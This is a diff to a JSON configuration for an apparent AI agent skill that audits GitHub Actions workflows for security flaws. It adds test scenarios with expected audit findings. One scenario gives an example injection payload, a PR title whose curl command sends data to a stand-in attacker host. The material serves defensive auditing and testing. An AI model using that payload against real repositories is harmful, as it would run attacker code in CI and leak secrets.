@@ -1,6 +1,16 @@
 {
   "name": "gha-security-review",
-  "version": "0.1.0",
+  "version": "0.2.0",
+  "verified": true,
+  "positive_keywords": [
+    "GHA",
+    "GitHub Actions",
+    "workflow",
+    "expression injection",
+    "permissions",
+    "supply chain",
+    "artifact"
+  ],
   "description": "Audits GitHub Actions workflow files for action-permission misuse, expression injection, unpinned third-party actions, permission scope abuse, secret leakage, cross-workflow attacks via workflow_run, and artifact poisoning. Each finding ships with file:line + attacker input + concrete exploit scenario, not just a vuln label. Complements security-and-hardening (app-layer) and security-devsecops (deps/IaC); targets the CI/CD layer specifically.",
   "positive_triggers": [
     {
@@ -65,8 +75,42 @@
         "Severity = CRITICAL (arbitrary code execution in CI context with workflow token)",
         "Mitigation is concrete: 'use on: pull_request for any step that checks out PR code or uses event.* as shell input; restrict pull_request_target to label/comment triage only'"
       ]
+    },
+    {
+      "scenario": "Workflow has a step: `run: echo \"PR title is: ${{ github.event.pull_request.title }}\" >> $GITHUB_OUTPUT`. Audit must catch the §3.2 expression-injection finding.",
+      "expected_behavior": [
+        "Audit enumerates categories §3.1 through §3.7; marks §3.2 (expression injection) as applicable",
+        "Finding cites the file:line of the offending `run:` block",
+        "Attacker input explicitly named: 'github.event.pull_request.title (set by attacker when they open PR)'",
+        "Exploit scenario: 'PR title = `$(curl -X POST https://attacker/x --data-binary @-)` — echo pipes into shell, curl fires'",
+        "Severity = HIGH (arbitrary code execution in CI context; escalates to CRITICAL if the same job has write permissions or secrets access)",
+        "Mitigation is concrete: 'never interpolate github.event.* into a shell run: block; pass via env: and read as a variable in script (no shell parsing); or use `printf '%s' \"$VAR\"` style quoting'",
+        "Output references §3.2 in the finding header so the second reviewer can cross-check"
+      ]
+    },
+    {
+      "scenario": "Workflow uses `uses: thomiceli/pack-action@v2` without a SHA pin. Audit must catch the §3.3 unpinned-action finding.",
+      "expected_behavior": [
+        "Audit enumerates §3.1 through §3.7; marks §3.3 (unpinned actions) as applicable",
+        "Finding cites file:line of the `uses:` line",
+        "Attacker input: 'action publisher of thomiceli/pack-action (tag reassignment, branch force-push, or account takeover) controls the byte-stream that runs in this step'",
+        "Exploit scenario: 'Action publisher gets phished; attacker moves v2 tag to malicious code; every CI run since then pulls the malicious version. With read+write token in env, attacker exfiltrates secrets.'",
+        "Severity = HIGH (supply chain; blast radius includes secrets in env)",
+        "Mitigation is concrete: `uses: thomiceli/pack-action@a1b2c3d4e5f6... # v2.x.y` (commit SHA + version comment)"
+      ]
+    },
+    {
+      "scenario": "Workflow has top-level `permissions: write-all` (legacy default), job is a `pull_request` lint-only job that doesn't need any write. Audit must catch the §3.4 excessive-permissions finding.",
+      "expected_behavior": [
+        "Audit enumerates §3.1 through §3.7; marks §3.4 (excessive permissions) as applicable",
+        "Finding cites file:line of the top-level `permissions:` block",
+        "Attacker input: 'attacker PR drops a poison step that exploits another finding (e.g. expression injection); runner has un-narrowed token scope'",
+        "Exploit scenario: 'Poison step in attacker PR (allowed via §3.1 or §3.2) writes commits to the protected branch bypassing code review, since `contents: write` is on the runner token by default.'",
+        "Severity = HIGH (cross-branch writes via PR contamination)",
+        "Mitigation is concrete: `permissions: read-all` at file top; per-job override only on jobs that need write (e.g. deploy)"
+      ]
     }
   ],
   "owner": "meisijiya",
-  "notes": "CI/CD-layer security audit. Complements the 3 other security skills on different layers: security-and-hardening (app code), security-devsecops (supply chain / deploy), security-incident-response (post-incident). Sourced from the Antigravity agent-skills family (gha-security-review) and StepSecurity HackerBot attack-pattern research. Routes through verification-before-completion dispatcher Priority table when user context is 'reviewing a PR with workflow changes' or 'modifying CI files'. Each finding must cite a concrete exploit scenario — vague vuln labels are red flags per the skill's own Red Flags section. Note: adding permission-deny lists and self-hosted runner hardening are OUT of scope (covered by security-devsecops)."
+  "notes": "CI/CD-layer security audit. Complements the 3 other security skills on different layers: security-and-hardening (app code), security-devsecops (supply chain / deploy), security-incident-response (post-incident). Sourced from the Antigravity agent-skills family (gha-security-review) and StepSecurity HackerBot attack-pattern research. Routes through verification-before-completion dispatcher Priority table when user context is 'reviewing a PR with workflow changes' or 'modifying CI files'. Each finding must cite a concrete exploit scenario — vague vuln labels are red flags per the skill's own Red Flags section. Note: adding permission-deny lists and self-hosted runner hardening are OUT of scope (covered by security-devsecops). Verified-level (2026-07-24): CI step asserts every positive_keyword appears in the description body. Adding/removing a category requires updating both the description AND positive_keywords in lockstep. §3.7 wording fixed (artifact name collision, not cache key collision) and §3.5 secret-leakage wording clarified (env var + URL exfiltration pattern, not the older FOO_TOKEN/MASKED_NAME confusion)."
 }
